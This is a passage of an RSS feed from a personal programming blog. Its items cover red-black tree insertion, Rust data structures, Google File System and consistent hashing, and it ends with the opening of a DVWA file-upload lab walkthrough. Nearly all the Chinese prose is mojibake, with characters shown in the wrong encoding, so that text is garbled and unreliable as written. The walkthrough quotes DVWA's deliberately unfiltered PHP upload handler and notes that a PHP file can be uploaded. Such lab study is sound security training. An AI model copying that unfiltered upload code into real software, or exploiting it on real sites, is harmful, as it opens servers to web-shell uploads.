&lt;li&gt;nodeçš„å”çˆ¶èŠ‚ç‚¹ä¸ºé»‘è‰²ï¼Œä¸”nodeå’Œnodeçš„çˆ¶èŠ‚ç‚¹ä¸åœ¨åŒä¸€è¾¹ (å³çˆ¶èŠ‚ç‚¹ä¸ºç¥–çˆ¶çš„å·¦å„¿å­æ—¶ï¼ŒNæ˜¯çˆ¶èŠ‚ç‚¹çš„å³å„¿å­ã€‚çˆ¶èŠ‚ç‚¹ä¸ºç¥–çˆ¶èŠ‚ç‚¹çš„å³å„¿å­æ—¶ã€‚Nä¹Ÿæ˜¯çˆ¶èŠ‚ç‚¹å·¦å³å„¿å­)ã€‚ä»¥çˆ¶èŠ‚ç‚¹ä¸ºç¥–çˆ¶èŠ‚ç‚¹çš„å·¦å„¿å­ä¸ºä¾‹ã€‚ä»¥çˆ¶èŠ‚ç‚¹ä¸ºåŸºå‡†ï¼Œè¿›è¡Œå·¦æ—‹ï¼Œç„¶åä»¥çˆ¶èŠ‚ç‚¹ä¸ºç›®æ ‡æ’å…¥èŠ‚ç‚¹è¿›å…¥æƒ…å†µ3çš„bæƒ…å†µè¿›è¡Œæ“ä½œã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/sdttttt/images/raw/master//Red-black_tree_insert_case_4.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;delete&#34;&gt;Delete&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªä»¥åå†è¯´.&lt;/p&gt;
&lt;h3 id=&#34;search&#34;&gt;Search&lt;/h3&gt;
&lt;p&gt;çº¢é»‘æ ‘ç®—æ˜¯æœç´¢äºŒå‰æ ‘çš„ä¸€ä¸ªå­é›†ï¼Œ&lt;code&gt;Search&lt;/code&gt;æ–¹æ³•æ˜¯ç›¸åŒçš„ã€‚&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Tree by Rust implement</title>
        <link>https://sdttttt.github.io/p/tree-by-rust-implement/</link>
        <pubDate>Wed, 20 May 2020 19:14:33 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/tree-by-rust-implement/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/code/carbon2.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Stack by Rust implement</title>
        <link>https://sdttttt.github.io/p/stack-by-rust-implement/</link>
        <pubDate>Wed, 20 May 2020 19:01:23 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/stack-by-rust-implement/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/code/carbon.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>GFS</title>
        <link>https://sdttttt.github.io/p/gfs/</link>
        <pubDate>Sat, 09 May 2020 13:00:00 +0000</pubDate>
        
        <guid>https://sdttttt.github.io/p/gfs/</guid>
        <description>&lt;p&gt;è¿™æ˜¯ &lt;code&gt;MIT 6.824&lt;/code&gt; è¯¾ç¨‹&lt;code&gt;GFS&lt;/code&gt;éƒ¨åˆ†çš„ä¸€äº›æ€»ç»“.&lt;/p&gt;
&lt;p&gt;GFS (Google File System) æ˜¯Googleä¸ºäº†ç®¡ç†æµ·é‡æ•°æ®è€Œå¼€å‘çš„ä¸€ä¸ªåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ.&lt;/p&gt;
&lt;p&gt;ç›´æ¥è¿›å…¥æ­£é¢˜.&lt;/p&gt;
&lt;p&gt;åœ¨GFSä¸­æ–‡ä»¶æ˜¯ä»¥&lt;code&gt;Chunk&lt;/code&gt;çš„å½¢å¼å­˜å‚¨ã€‚æ‰€è°“çš„&lt;code&gt;Chunk&lt;/code&gt;æ˜¯ä¸€ä¸ªå‚¨å­˜å—ã€‚ä¸€ä¸ªChunkçš„å¤§å°ä¸º64MB.ä¸€ä¸ªæ–‡ä»¶ä¼šåˆ†ä¸ºå¤šä¸ªChunk.å‚¨å­˜åœ¨ä¸åŒçš„æœåŠ¡å™¨é‡Œã€‚å½“ç„¶ä¹Ÿä¼šæœ‰2-3ä»½&lt;code&gt;Chunk&lt;/code&gt;çš„æ‹·è´ã€‚&lt;/p&gt;
&lt;p&gt;GFSä¸­è¿˜å­˜åœ¨ä¸€ä¸ª&lt;code&gt;Master&lt;/code&gt;ï¼ŒMasteræ”¶é›†æ‰€æœ‰æ–‡ä»¶çš„metadata, ä¿å­˜åœ¨ä¸€å¼ è¡¨ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢ç®€å•çš„è§£é‡Šä¸€ä¸‹è¯»æ“ä½œçš„äº¤äº’ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Client&lt;/code&gt;æŒ‡å®šçš„æ–‡ä»¶åå’Œå­—èŠ‚åç§»è½¬æ¢æˆæ–‡ä»¶çš„ä¸€ä¸ªå—ç´¢å¼•ï¼ˆ&lt;code&gt;Chunk Index&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;ç»™&lt;code&gt;Master&lt;/code&gt;å‘é€ä¸€ä¸ªåŒ…å«æ–‡ä»¶åå’Œå—ç´¢å¼•çš„è¯·æ±‚ã€‚&lt;/li&gt;
&lt;li&gt;masterå›åº”å¯¹åº”çš„&lt;code&gt;Chunk Handle&lt;/code&gt;(å­˜å‚¨æ•°æ®æœåŠ¡å™¨ä»¥&lt;code&gt;Chunk Handle&lt;/code&gt;æ ‡è¯†&lt;code&gt;Chunk&lt;/code&gt;)å’Œå‰¯æœ¬çš„ä½ç½®ï¼ˆå¤šä¸ªå‰¯æœ¬ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Client&lt;/code&gt;ä»¥æ–‡ä»¶åå’Œå—ç´¢å¼•ä¸ºé”®ç¼“å­˜è¿™äº›ä¿¡æ¯ã€‚ï¼ˆhandleå’Œå‰¯æœ¬çš„ä½ç½®ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Client&lt;/code&gt;å‘å…¶ä¸­ä¸€ä¸ªå‰¯æœ¬å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¾ˆå¯èƒ½æ˜¯æœ€è¿‘çš„ä¸€ä¸ªå‰¯æœ¬ã€‚è¯·æ±‚æŒ‡å®šäº†&lt;code&gt;Chunk Handle&lt;/code&gt;å’Œå—å†…çš„ä¸€ä¸ªå­—èŠ‚åŒºé—´ã€‚&lt;/li&gt;
&lt;li&gt;é™¤éç¼“å­˜çš„ä¿¡æ¯ä¸å†æœ‰æ•ˆï¼ˆcache for a limited timeï¼‰æˆ–æ–‡ä»¶è¢«é‡æ–°æ‰“å¼€ï¼Œå¦åˆ™ä»¥åå¯¹åŒä¸€ä¸ªå—çš„è¯»æ“ä½œä¸å†éœ€è¦clientå’Œmasteré—´çš„äº¤äº’ã€‚&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•</title>
        <link>https://sdttttt.github.io/p/%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95/</link>
        <pubDate>Mon, 27 Apr 2020 10:05:10 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95/</guid>
        <description>&lt;p&gt;ç¬¬ä¸€ä»£åˆ†å¸ƒå¼ç³»ç»Ÿé‡‡ç”¨çš„æ˜¯ä¸­å¿ƒåŒ–çš„ç³»ç»Ÿï¼Œå¯¹äºå­˜è´®å¤§é‡æ•°æ®çš„åˆ†å¸ƒå¼ç³»ç»Ÿæ¥è¯´å®ƒçš„ç¼ºç‚¹å°±æ˜¯&lt;code&gt;ä¸­å¤®èŠ‚ç‚¹&lt;/code&gt;æˆä¸ºäº†æ•´ä¸ªä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿçš„&lt;code&gt;å•ç‚¹æ•…éšœ&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒä»£åˆ†å¸ƒå¼ç³»ç»Ÿï¼ŒèŠ‚ç‚¹ä¹‹é—´é€šè¡Œé‡‡ç”¨çš„æ˜¯&lt;code&gt;å¹¿æ’­&lt;/code&gt;ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½å‘è‡ªå·±ç›¸è¿çš„&lt;code&gt;æ‰€æœ‰èŠ‚ç‚¹&lt;/code&gt;è¿›è¡Œè¯¢é—®ï¼Œè¢«è¯¢é—®çš„èŠ‚ç‚¹å¦‚æœä¸çŸ¥é“è¿™ä¸ªæ–‡ä»¶åœ¨å“ªé‡Œ,å°±å†æ¬¡è¿›è¡Œ&lt;code&gt;å¹¿æ’­&lt;/code&gt;&amp;hellip;&amp;hellip;å¦‚æ­¤å¾€å¤,ç›´è‡³æ‰¾åˆ°æ‰€éœ€æ–‡ä»¶ã€‚è¯·æ±‚å˜å¤šå°±æ„å‘³ç€ä¼šäº§ç”Ÿ&lt;code&gt;å¹¿æ’­é£æš´&lt;/code&gt;ï¼Œè¿™ä¼šä¸¥é‡å ç”¨å¸¦å®½å’Œç³»ç»Ÿèµ„æºã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸‰ä»£åˆ†å¸ƒå¼ç³»ç»Ÿå¼€å§‹é‡‡ç”¨&lt;code&gt;DHT&lt;/code&gt;(Distrbuted Hash Table)ï¼Œä¹Ÿå°±æ˜¯&lt;code&gt;ä¸€è‡´æ€§HASHç®—æ³•&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;ç®—æ³•èƒŒæ™¯&#34;&gt;ç®—æ³•èƒŒæ™¯&lt;/h2&gt;
&lt;p&gt;ä¸€è‡´æ€§ HASH ç®—æ³•åœ¨ 1997 å¹´ç”±éº»çœç†å·¥å­¦é™¢çš„ Karger ç­‰äººåœ¨è§£å†³åˆ†å¸ƒå¼ Cache ä¸­æå‡ºçš„,è®¾è®¡ç›®æ ‡æ˜¯ä¸ºäº†
è§£å†³å› ç‰¹ç½‘ä¸­çš„çƒ­ç‚¹(Hot spot)é—®é¢˜,åˆè¡·å’Œ CARP ååˆ†ç±»ä¼¼ã€‚ä¸€è‡´æ€§ HASH ä¿®æ­£äº† CARP ä½¿ç”¨çš„ç®€å•å“ˆå¸Œ
ç®—æ³•å¸¦æ¥çš„é—®é¢˜,ä½¿å¾— DHT å¯ä»¥åœ¨ P2P ç¯å¢ƒä¸­çœŸæ­£å¾—åˆ°åº”ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ä½†ç°åœ¨ä¸€è‡´æ€§ hash ç®—æ³•åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä¹Ÿå¾—åˆ°äº†å¹¿æ³›åº”ç”¨,ç ”ç©¶è¿‡ &lt;code&gt;memcached&lt;/code&gt; ç¼“å­˜æ•°æ®åº“çš„äººéƒ½çŸ¥é“,
&lt;code&gt;memcached&lt;/code&gt; æœåŠ¡å™¨ç«¯æœ¬èº«ä¸æä¾›åˆ†å¸ƒå¼ &lt;code&gt;Cache&lt;/code&gt; çš„ä¸€è‡´æ€§,è€Œæ˜¯ç”±å®¢æˆ·ç«¯æ¥æä¾›,å…·ä½“åœ¨è®¡ç®—ä¸€è‡´æ€§ HASH æ—¶é‡‡ç”¨å¦‚ä¸‹æ­¥éª¤:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;é¦–å…ˆæ±‚å‡º memcached æœåŠ¡å™¨(èŠ‚ç‚¹)çš„å“ˆå¸Œå€¼,å¹¶å°†å…¶é…ç½®åˆ° &lt;code&gt;0 ~ 2^32&lt;/code&gt; çš„åœ†(continuum)ä¸Šã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç„¶åé‡‡ç”¨åŒæ ·çš„æ–¹æ³•æ±‚å‡ºå­˜å‚¨æ•°æ®çš„é”®çš„å“ˆå¸Œå€¼,å¹¶æ˜ å°„åˆ°ç›¸åŒçš„åœ†ä¸Šã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç„¶åä»æ•°æ®æ˜ å°„åˆ°çš„ä½ç½®å¼€å§‹é¡ºæ—¶é’ˆæŸ¥æ‰¾,å°†æ•°æ®ä¿å­˜åˆ°æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªæœåŠ¡å™¨ä¸Šã€‚å¦‚æœè¶…è¿‡ 2^32 ä»ç„¶æ‰¾ä¸åˆ°æœåŠ¡å™¨,å°±ä¼šä¿å­˜åˆ°ç¬¬ä¸€å° memcached æœåŠ¡å™¨ä¸Šã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/ConsistentHashAlgorithm/1.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;ä»ä¸Šå›¾çš„çŠ¶æ€ä¸­æ·»åŠ ä¸€å° memcached æœåŠ¡å™¨ã€‚ä½™æ•°åˆ†å¸ƒå¼ç®—æ³•ç”±äºä¿å­˜é”®çš„æœåŠ¡å™¨ä¼šå‘ç”Ÿå·¨å¤§å˜åŒ–
è€Œå½±å“ç¼“å­˜çš„å‘½ä¸­ç‡,ä½†&lt;code&gt;ä¸€è‡´æ€§Hashing&lt;/code&gt; ä¸­,åªæœ‰åœ¨åœ†(continuum)ä¸Šå¢åŠ æœåŠ¡å™¨çš„åœ°ç‚¹é€†æ—¶é’ˆæ–¹å‘
çš„ç¬¬ä¸€å°æœåŠ¡å™¨ä¸Šçš„é”®ä¼šå—åˆ°å½±å“ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ€§è´¨&#34;&gt;æ€§è´¨&lt;/h2&gt;
&lt;p&gt;å› ä¸ºè€ƒè™‘åˆ°æ•´ä¸ªç³»ç»Ÿçš„èŠ‚ç‚¹æ•°é‡æ˜¯åŠ¨æ€çš„ï¼Œæ¯æ—¶æ¯åˆ»æœ‰æ–°èŠ‚ç‚¹åŠ å…¥å’Œæ—§èŠ‚ç‚¹çš„å¤±æ•ˆã€‚
åœ¨è¿™ç±»æƒ…å†µä¸‹ä¾ç„¶è¦ä¿è¯ç³»ç»Ÿçš„å¯ç”¨æ€§ï¼Œè¿™æ˜¯å€¼å¾—æ€è€ƒçš„ï¼Œå°¤å…¶æ˜¯åœ¨è®¾è®¡åˆ†å¸ƒå¼ç¼“å­˜ç³»ç»Ÿçš„æ—¶å€™ã€‚
å¦‚æœä¸é‡‡ç”¨&lt;code&gt;ä¸€è‡´æ€§HASHç®—æ³•&lt;/code&gt;, å®¢æˆ·ç«¯åœ¨è®¡ç®—æ•°æ®çš„ hash æ—¶å¾€å¾€è¦é‡æ–°è®¡ç®—(é€šå¸¸è¿™ä¸ª Hash ç®—æ³•å’Œç³»ç»Ÿä¸­çš„èŠ‚ç‚¹æ•°é‡æœ‰å…³),
ç”±äº Hash å€¼å·²ç»æ”¹å˜ï¼Œæ‰€ä»¥å¾ˆæœ‰å¯èƒ½æ‰¾ä¸åˆ°åœ¨æ•´ä¸ªç³»ç»Ÿä¸­æ‰€å¯¹åº”çš„èŠ‚ç‚¹ï¼Œå¯¼è‡´ä¸å¯ç”¨ã€‚æ‰€ä»¥&lt;code&gt;ä¸€è‡´æ€§HASHç®—æ³•&lt;/code&gt;ï¼Œåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ååˆ†é‡è¦ã€‚&lt;/p&gt;
&lt;p&gt;è‰¯å¥½çš„&lt;code&gt;ä¸€è‡´æ€§HASHç®—æ³•&lt;/code&gt;éœ€è¦æ»¡è¶³ä¸€ä¸‹ç‰¹ç‚¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å¹³è¡¡æ€§(Balance)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¹³è¡¡æ€§æ˜¯æŒ‡å“ˆå¸Œçš„ç»“æœèƒ½å¤Ÿå°½å¯èƒ½åˆ†å¸ƒåˆ°æ‰€æœ‰çš„ç¼“å†²ä¸­å»,è¿™æ ·å¯ä»¥ä½¿å¾—æ‰€æœ‰çš„ç¼“å†²ç©ºé—´éƒ½å¾—åˆ°åˆ©ç”¨ã€‚å¾ˆå¤šå“ˆå¸Œç®—æ³•éƒ½èƒ½å¤Ÿæ»¡è¶³è¿™ä¸€æ¡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å•è°ƒæ€§(Monotonicity)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å•è°ƒæ€§æ˜¯æŒ‡å¦‚æœå·²ç»æœ‰ä¸€äº›å†…å®¹é€šè¿‡å“ˆå¸Œåˆ†æ´¾åˆ°äº†ç›¸åº”çš„ç¼“å†²ä¸­,åˆæœ‰æ–°çš„ç¼“å†²åŒºåŠ å…¥åˆ°ç³»ç»Ÿä¸­,é‚£ä¹ˆå“ˆ å¸Œçš„ç»“æœåº”èƒ½å¤Ÿä¿è¯åŸæœ‰å·²åˆ†é…çš„å†…å®¹å¯ä»¥è¢«æ˜ å°„åˆ°æ–°çš„ç¼“å†²åŒºä¸­å»,è€Œä¸ä¼šè¢«æ˜ å°„åˆ°æ—§çš„ç¼“å†²é›†åˆä¸­çš„ å…¶ä»–ç¼“å†²åŒºã€‚ç®€å•çš„å“ˆå¸Œç®—æ³•å¾€å¾€ä¸èƒ½æ»¡è¶³å•è°ƒæ€§çš„è¦æ±‚,å¦‚æœ€ç®€å•çš„çº¿æ€§å“ˆå¸Œ:x = (ax + b) mod (P), åœ¨ä¸Šå¼ä¸­,P è¡¨ç¤ºå…¨éƒ¨ç¼“å†²çš„å¤§å°ã€‚ä¸éš¾çœ‹å‡º,å½“ç¼“å†²å¤§å°å‘ç”Ÿå˜åŒ–æ—¶(ä» P1 åˆ° P2),åŸæ¥æ‰€æœ‰çš„å“ˆå¸Œç»“æœ å‡ä¼šå‘ç”Ÿå˜åŒ–,ä»è€Œä¸æ»¡è¶³å•è°ƒæ€§çš„è¦æ±‚ã€‚å“ˆå¸Œç»“æœçš„å˜åŒ–æ„å‘³ç€å½“ç¼“å†²ç©ºé—´å‘ç”Ÿå˜åŒ–æ—¶,æ‰€æœ‰çš„æ˜ å°„å…³ ç³»éœ€è¦åœ¨ç³»ç»Ÿå†…å…¨éƒ¨æ›´æ–°ã€‚è€Œåœ¨ P2P ç³»ç»Ÿå†…,ç¼“å†²çš„å˜åŒ–ç­‰ä»·äº Peer åŠ å…¥æˆ–é€€å‡ºç³»ç»Ÿ,è¿™ä¸€æƒ…å†µåœ¨ P2P ç³» ç»Ÿä¸­ä¼šé¢‘ç¹å‘ç”Ÿ,å› æ­¤ä¼šå¸¦æ¥æå¤§è®¡ç®—å’Œä¼ è¾“è´Ÿè·ã€‚å•è°ƒæ€§å°±æ˜¯è¦æ±‚å“ˆå¸Œç®—æ³•èƒ½å¤Ÿåº”å¯¹è¿™ç§æƒ…å†µã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åˆ†æ•£æ€§(Spread)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸­,ç»ˆç«¯æœ‰å¯èƒ½çœ‹ä¸åˆ°æ‰€æœ‰çš„ç¼“å†²,è€Œæ˜¯åªèƒ½çœ‹åˆ°å…¶ä¸­çš„ä¸€éƒ¨åˆ†ã€‚å½“ç»ˆç«¯å¸Œæœ›é€šè¿‡å“ˆå¸Œè¿‡ç¨‹ å°†å†…å®¹æ˜ å°„åˆ°ç¼“å†²ä¸Šæ—¶,ç”±äºä¸åŒç»ˆç«¯æ‰€è§çš„ç¼“å†²èŒƒå›´æœ‰å¯èƒ½ä¸åŒ,ä»è€Œå¯¼è‡´å“ˆå¸Œçš„ç»“æœä¸ä¸€è‡´,æœ€ç»ˆçš„ ç»“æœæ˜¯ç›¸åŒçš„å†…å®¹è¢«ä¸åŒçš„ç»ˆç«¯æ˜ å°„åˆ°ä¸åŒçš„ç¼“å†²åŒºä¸­ã€‚è¿™ç§æƒ…å†µæ˜¾ç„¶æ˜¯åº”è¯¥é¿å…çš„,å› ä¸ºå®ƒå¯¼è‡´ç›¸åŒå†… å®¹è¢«å­˜å‚¨åˆ°ä¸åŒç¼“å†²ä¸­å»,é™ä½äº†ç³»ç»Ÿå­˜å‚¨çš„æ•ˆç‡ã€‚åˆ†æ•£æ€§çš„å®šä¹‰å°±æ˜¯ä¸Šè¿°æƒ…å†µå‘ç”Ÿçš„ä¸¥é‡ç¨‹åº¦ã€‚å¥½çš„å“ˆ å¸Œç®—æ³•åº”èƒ½å¤Ÿå°½é‡é¿å…ä¸ä¸€è‡´çš„æƒ…å†µå‘ç”Ÿ,ä¹Ÿå°±æ˜¯å°½é‡é™ä½åˆ†æ•£æ€§ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è´Ÿè½½(Load)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è´Ÿè½½é—®é¢˜å®é™…ä¸Šæ˜¯ä»å¦ä¸€ä¸ªè§’åº¦çœ‹å¾…åˆ†æ•£æ€§é—®é¢˜ã€‚æ—¢ç„¶ä¸åŒçš„ç»ˆç«¯å¯èƒ½å°†ç›¸åŒçš„å†…å®¹æ˜ å°„åˆ°ä¸åŒçš„ç¼“å†²åŒº ä¸­,é‚£ä¹ˆå¯¹äºä¸€ä¸ªç‰¹å®šçš„ç¼“å†²åŒºè€Œè¨€,ä¹Ÿå¯èƒ½è¢«ä¸åŒçš„ç”¨æˆ·æ˜ å°„ä¸ºä¸åŒçš„å†…å®¹ã€‚ä¸åˆ†æ•£æ€§ä¸€æ ·,è¿™ç§æƒ…å†µ ä¹Ÿæ˜¯åº”å½“é¿å…çš„,å› æ­¤å¥½çš„å“ˆå¸Œç®—æ³•åº”èƒ½å¤Ÿå°½é‡é™ä½ç¼“å†²çš„è´Ÿè·ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å¹³æ»‘æ€§(Smoothness)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¹³æ»‘æ€§æ˜¯æŒ‡ç¼“å­˜æœåŠ¡å™¨çš„æ•°ç›®å¹³æ»‘æ”¹å˜å’Œç¼“å­˜å¯¹è±¡çš„å¹³æ»‘æ”¹å˜æ˜¯ä¸€è‡´çš„ã€‚&lt;/p&gt;
&lt;h2 id=&#34;è™šæ‹ŸèŠ‚ç‚¹&#34;&gt;è™šæ‹ŸèŠ‚ç‚¹&lt;/h2&gt;
&lt;p&gt;å‡è®¾åœ¨åœ†ä¸Š&lt;code&gt;Node A&lt;/code&gt;å’Œ&lt;code&gt;Node B&lt;/code&gt;è·ç¦»è¿‡è¿‘ï¼ŒæŒ‰ç…§ä»¥ä¸Šçš„ç¯å½¢ä¸€è‡´ HASH ç®—æ³•å°±ä¼šå‘ç”Ÿä¸¤ä¸ªèŠ‚ç‚¹æ‰€æ‹¥æœ‰çš„æ•°æ®æ•°é‡ä¸ä¸€è‡´çš„é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sdttttt.github.io/ConsistentHashAlgorithm/2.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;ä¸ºäº†è§£å†³è¿™ç§æ•°æ®å€¾æ–œé—®é¢˜ï¼Œä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å¼•å…¥äº†è™šæ‹ŸèŠ‚ç‚¹æœºåˆ¶ï¼Œå³å¯¹æ¯ä¸€ä¸ªæœåŠ¡èŠ‚ç‚¹è®¡ç®—&lt;code&gt;å¤šä¸ªå“ˆå¸Œ&lt;/code&gt;ï¼Œæ¯ä¸ªè®¡ç®—ç»“æœä½ç½®éƒ½æ”¾ç½®ä¸€ä¸ªæ­¤&lt;code&gt;æœåŠ¡èŠ‚ç‚¹&lt;/code&gt;ï¼Œç§°ä¸ºè™šæ‹ŸèŠ‚ç‚¹ã€‚å…·ä½“åšæ³•å¯ä»¥åœ¨æœåŠ¡å™¨ ip æˆ–ä¸»æœºåçš„åé¢å¢åŠ ç¼–å·æ¥å®ç°ã€‚ä¾‹å¦‚ä¸Šé¢çš„æƒ…å†µï¼Œå¯ä»¥ä¸ºæ¯å°æœåŠ¡å™¨è®¡ç®—ä¸‰ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼Œäºæ˜¯å¯ä»¥åˆ†åˆ«è®¡ç®— â€œNode A#1â€ã€â€œNode A#2â€ã€â€œNode A#3â€ã€â€œNode B#1â€ã€â€œNode B#2â€ã€â€œNode B#3â€çš„å“ˆå¸Œå€¼ï¼Œäºæ˜¯å½¢æˆå…­ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼š&lt;/p&gt;
&lt;p&gt;åŒæ—¶æ•°æ®å®šä½ç®—æ³•ä¸å˜ï¼Œåªæ˜¯å¤šäº†ä¸€æ­¥è™šæ‹ŸèŠ‚ç‚¹åˆ°å®é™…èŠ‚ç‚¹çš„æ˜ å°„ï¼Œä¾‹å¦‚å®šä½åˆ°â€œNode A#1â€ã€â€œNode A#2â€ã€â€œNode A#3â€ä¸‰ä¸ªè™šæ‹ŸèŠ‚ç‚¹çš„æ•°æ®å‡å®šä½åˆ° Node A ä¸Šã€‚è¿™æ ·å°±è§£å†³äº†æœåŠ¡èŠ‚ç‚¹å°‘æ—¶æ•°æ®å€¾æ–œçš„é—®é¢˜ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œé€šå¸¸å°†è™šæ‹ŸèŠ‚ç‚¹æ•°è®¾ç½®ä¸º 32 ç”šè‡³æ›´å¤§ï¼Œå› æ­¤å³ä½¿å¾ˆå°‘çš„æœåŠ¡èŠ‚ç‚¹ä¹Ÿèƒ½åšåˆ°ç›¸å¯¹å‡åŒ€çš„æ•°æ®åˆ†å¸ƒã€‚&lt;/p&gt;
</description>
        </item>
        <item>
        <title>File Upload</title>
        <link>https://sdttttt.github.io/p/file-upload/</link>
        <pubDate>Sun, 12 Apr 2020 10:46:06 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/file-upload/</guid>
        <description>&lt;p&gt;DVWA File upload è¿‡å…³ç§˜ç±.&lt;/p&gt;
&lt;h3 id=&#34;low&#34;&gt;LOW&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Upload&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Where are we going to be writing to?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DVWA_WEB_PAGE_TO_ROOT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hackable/uploads/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;basename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Can we move the file to the upload folder?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// å®Œå…¨æ²¡åšè¿‡æ»¤.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// ä¸Šä¼ ä¸€ä¸ªPHPæ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥çš„.
